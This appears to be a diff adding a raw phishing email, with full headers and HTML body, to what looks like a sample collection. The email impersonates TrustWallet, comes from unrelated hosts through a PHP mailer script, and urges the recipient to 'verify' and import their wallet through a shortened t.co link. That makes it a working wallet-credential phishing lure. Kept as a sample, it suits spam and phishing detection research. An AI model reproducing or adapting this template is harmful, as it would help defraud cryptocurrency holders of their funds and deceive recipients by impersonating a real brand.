@@ -1,0 +1,134 @@
+Return-Path: <postmaster@49f27ea9a7.nxcli.io>
+Delivered-To: info@vorteksenerji.com
+Received: from fr-life.guzelhosting.com
+	by fr-life.guzelhosting.com with LMTP
+	id vc5GOhcwGmm/AgAAOB6+FQ
+	(envelope-from <postmaster@49f27ea9a7.nxcli.io>)
+	for <info@vorteksenerji.com>; Sun, 16 Nov 2025 23:12:07 +0300
+Return-path: <postmaster@49f27ea9a7.nxcli.io>
+Envelope-to: info@vorteksenerji.com
+Delivery-date: Sun, 16 Nov 2025 23:12:08 +0300
+Received: from cloudhost-2963186.us-midwest-1.nxcli.net ([209.87.149.96]:31200)
+	by fr-life.guzelhosting.com with esmtps  (TLS1.2) tls TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
+	(Exim 4.98.1)
+	(envelope-from <postmaster@49f27ea9a7.nxcli.io>)
+	id 1vKj6V-000000008KN-2FDR
+	for info@vorteksenerji.com;
+	Sun, 16 Nov 2025 23:12:07 +0300
+Comment: DomainKeys? See http://domainkeys.sourceforge.net/
+DomainKey-Signature: a=rsa-sha1; q=dns; c=nofws;
+  s=default; d=49f27ea9a7.nxcli.io;
+  b=R37RlSEJ9ItRR55bmKuz6e4OpsFIakfSYHS6H/wvbP48F3F3X6/g91fQ5Skcd608+bi7IYeQ1ac0AI1LAzVV+93Pm+tIBiYg4fufaqrZyr2kD+uh6ttnhJ15d+fRkmKDdqCuI10vCppAlUWUxF+9/DhymV1oRUaKHC/ajpDogpetBsxo0xktf4PDC6yeJE3yoeTIJW/G0+dyuTbSbVXG1hPzTJbQtlq8lLSD6TrvPk/zmSANDg7crCUhb83V4hHtoN4WFBpvnauHpZANOV5rFqiAQJPPNNHMez+q2WAhIM5EHgKIluYchIdM6BQbDXYhcbLx3eCN/V1KFaQ4TQ3ToA==;
+  h=Received:Date:Message-ID:To:Subject:X-PHP-Originating-Script:From:Reply-To:MIME-Version:Content-Type:X-Mailer:X-Priority:List-Unsubscribe;
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed; d=49f27ea9a7.nxcli.io; h=
+	date:message-id:to:subject:from:reply-to:mime-version
+	:content-type:list-unsubscribe; s=default; bh=9NQwJmu0PxH+LGgbDw
+	WuPbeFbrSvoo00KnAYD5S7qaU=; b=oofv44AqHg2whjGgQN+wmvh+UtbYPyrFg0
+	yG3zun0zXu7BdslRx++KagFbX6TR4oVUHEIcl4XTbAT9srW/NkmasF93TYI1vW6z
+	BUzjsM83kI2/TcYh0sREjV96KSqGK1cUAA3HqcsVATnqMG2v31pmZdZGrcUIQ23p
+	BWnKFZYkb6ewwuW8w0Gbk2qRwj2QyjTChNW0sdjgUfq9hJmrANryff9fxXyp1VDB
+	4LyI3C8gsxa6clxN6we+7wcXMNpMBRzyHUMZ0snQu22XV7uiK8Z7ZPNeQGD92fJG
+	g6GYSGl95JAhb3/My9fwObMHpw5TvPweBPoUvrgskB8PXZeUZebw==
+Received: (qmail 30063 invoked by uid 10190); 16 Nov 2025 19:34:36 +0000
+Date: 16 Nov 2025 19:34:36 +0000
+Message-ID: <20251116193436.30053.qmail@cloudhost-2963186.us-midwest-1.nxcli.net>
+To: info@vorteksenerji.com
+Subject: Security Notification: Review Required
+X-PHP-Originating-Script: 10190:done.php
+From: "TrustWallet 🔵" <3byxqyns@rvq.io>
+Reply-To: 3byxqyns@rvq.io
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+X-Mailer: PHP/8.2.20
+X-Priority: 3
+List-Unsubscribe: <mailto:unsubscribe@3byxqyns@rvq.io>
+
+
+<p>&nbsp;</p>
+<div class="email-wrap" role="article" aria-label="TrustWallet verification email" 
+     style="max-width:600px;margin:0 auto;background:#ffffff;border-radius:10px;
+     font-family:Arial,Helvetica,sans-serif;color:#222;overflow:hidden;">
+
+  <!-- HEADER -->
+  <div class="header" style="display:flex;align-items:center;padding:20px;">
+    <div class="logo" style="width:48px;height:48px;background:#1a73e8;color:#fff;
+         border-radius:10px;display:flex;align-items:center;justify-content:center;
+         font-size:26px;font-weight:700;margin-right:12px;">
+      T
+    </div>
+    <div>
+      <div style="font-weight:600;font-size:18px;color:#1a73e8;">TrustWallet.</div>
+      <div class="meta" style="font-size:12px;color:#777;">16 Nov. 2025 &nbsp;·&nbsp; Unsubscribe</div>
+    </div>
+  </div>
+
+  <!-- SUBJECT + IMAGE -->
+  <div class="subject" style="padding:0 20px 15px;">
+    <h1 style="font-size:22px;margin:0 0 10px;color:#111;">
+      [TrustWallet] Alert: Verify Your <span style="color:#1a73e8;">Wallet</span> Today
+    </h1>
+    <p style="margin:0;">
+      <img src="https://trustwallet.com/_next/image?url=https%3A%2F%2Fstrapi-cdn.trustwallet.com%2Fhow_to_use_walletconnect_8988f29533.png&w=3840&q=75"
+           alt="Wallet Image" width="316" style="border-radius:8px;height:auto;">
+    </p>
+  </div>
+
+  <!-- BANNER -->
+  <div class="banner" style="display:flex;align-items:center;padding:20px;background:#f5f7fb;">
+    <div style="flex:1;">
+      <h2 style="margin:0 0 6px;font-size:20px;color:#111;">How to Import Your TrustWallet</h2>
+      <p style="margin:0;opacity:0.9;font-size:14px;">
+        Securely import and verify your wallet to access your assets.
+      </p>
+    </div>
+    <div class="art" style="font-size:32px;font-weight:700;color:#1a73e8;opacity:0.6;">
+      ART
+    </div>
+  </div>
+
+  <!-- CONTENT -->
+  <div class="content" style="padding:20px;">
+    <p style="margin:0 0 15px;">Hi <span style="color:#1a73e8;">TrustWallet</span> User <strong>#4945649</strong>,</p>
+
+    <p style="margin:0 0 15px;">
+      Thank you for initiating your <span style="color:#1a73e8;">TrustWallet</span> verification process.
+      Please review your verification details below:
+    </p>
+
+    <div class="details" style="background:#f9f9f9;padding:12px;border-radius:6px;margin-bottom:20px;">
+      <ul style="padding-left:20px;margin:0;font-size:14px;line-height:1.6;">
+        <li><strong>Wallet Verification Link:</strong> 
+          <a href="https://t.co/lTqymy5nue?id=613170649443390060-5774" style="color:#1a73e8;text-decoration:none;font-weight:600;">Open TrustWallet Panel</a>
+        </li>
+      </ul>
+    </div>
+
+    <p style="margin:0 0 15px;">
+      With <span style="color:#1a73e8;">TrustWallet</span>, you can safely manage, organize, 
+      and access your digital environment anytime. We’re committed to giving you a smooth, 
+      reliable, and secure experience.
+    </p>
+
+    <p style="margin:0 0 15px;">Here’s what you can do using your wallet:</p>
+
+    <ul style="padding-left:20px;margin:0 0 20px;font-size:14px;line-height:1.6;">
+      <li>Manage your digital items securely.</li>
+    </ul>
+
+    <div class="reply-area" aria-hidden="true" 
+         style="display:flex;gap:10px;margin-top:10px;">
+      <button type="button" style="padding:6px 10px;border:1px solid #ddd;border-radius:6px;background:#fff;cursor:pointer;">↩️ Reply</button>
+      <button type="button" style="padding:6px 10px;border:1px solid #ddd;border-radius:6px;background:#fff;cursor:pointer;">⤴️ Forward</button>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <div class="footer" style="padding:20px;border-top:1px solid #eee;text-align:left;">
+    <div style="font-weight:600;margin-bottom:6px;color:#1a73e8;">TrustWallet</div>
+    <div style="font-size:12px;color:#777;">
+      If you did not request this verification, please ignore this email or contact support.
+    </div>
+  </div>
+
+</div>
+
